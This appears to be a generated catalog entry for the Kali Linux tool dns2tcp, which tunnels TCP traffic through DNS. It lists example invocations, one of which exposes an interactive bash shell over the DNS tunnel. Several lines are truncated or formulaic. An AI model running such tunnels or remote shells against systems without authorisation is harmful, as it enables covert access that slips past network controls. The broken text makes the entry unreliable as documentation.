name: dns2tcp
title: dns2tcp
description:
TCP-over-DNS tunnel server and client
dns2tcp is a set of tools to encapsulate a TCP session in DNS packets.
This type of encapsulation generates smaller packets than IP-over-DNS,
improving throughput. The client does not need root privileges.1

commands.name: dns2tcpc
commands.description: A tunneling tool that encapsulate TCP traffic over DNS.

arguments.description: DNS compression. When used, be sure that all relay and DNS server support com-
arguments.raw: -c  DNS compression. When used, be sure that all relay and DNS server support com-

commands.name: dns2tcpd
commands.description: A tunneling tool that encapsulate TCP traffic over DNS.

command_examples: dns2tcpc  [  -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource ] [ -k key ] [ -f
ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver
dns2tcpc -d 1 -f /dev/null -r ssl-tunnel -l 2000 -k mykey  -T KEY -z dns2tcp.hsc.fr mydns
use_cases: When you need Kali Linux, use dns2tcpc because TCP-over-DNS tunnel server and client.
When the engagement is in the install phase, use dns2tcpc as a cataloged Kali Linux tool with operator ACCEPT/CANCEL gating.
When you need a concrete invocation, run `dns2tcpc  [  -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource ] [ -k key ] [ -f` as documented upstream for dns2tcpc.
When you need a concrete invocation, run `dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns` as documented upstream for dns2tcpc.
When you need a concrete invocation, run `ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver` as documented upstream for dns2tcpc.
When you need a concrete invocation, run `dns2tcpc -r socat-resource -e '/bin/bash -i' -k mykey -z dns2tcp.hsc.fr mydns` as documented upstream for dns2tcpc.
When chaining Kali Linux tools, pair dns2tcpc with sibling catalog entries sharing its attack_surface/phase_hint.
When validating lab setup, run `dns2tcpc --help` (or the README entrypoint) and confirm required hardware/deps from the catalog.

documentation.readme: dns2tcpc - A tunneling tool that encapsulate TCP traffic over DNS.
documentation.how_to_use: Install/setup: sudo apt install dns2tcp. Run the primary entrypoint as shown in upstream docs, e.g. `dns2tcpc  [  -h ] [ -c ] [ -z domain zone ] [ -d debug_level ] [ -r resource ] [ -k key ] [ -f`. Further invocations from upstream: `dns2tcpc -k mykey -z dns2tcp.hsc.fr mydns`; `ssh -o 'ProxyCommand dns2tcpc -r ssh -l - -z dns2tcp.hsc.fr -k mykey mydns' myserver`.
documentation.when_to_use: Use during the 'install' phase against surfaces [local] in the Kali Linux category. Fits when the engagement needs: TCP-over-DNS tunnel server and client.
documentation.why_to_use: Prefer this tool based on upstream description: dns2tcpc - A tunneling tool that encapsulate TCP traffic over DNS.
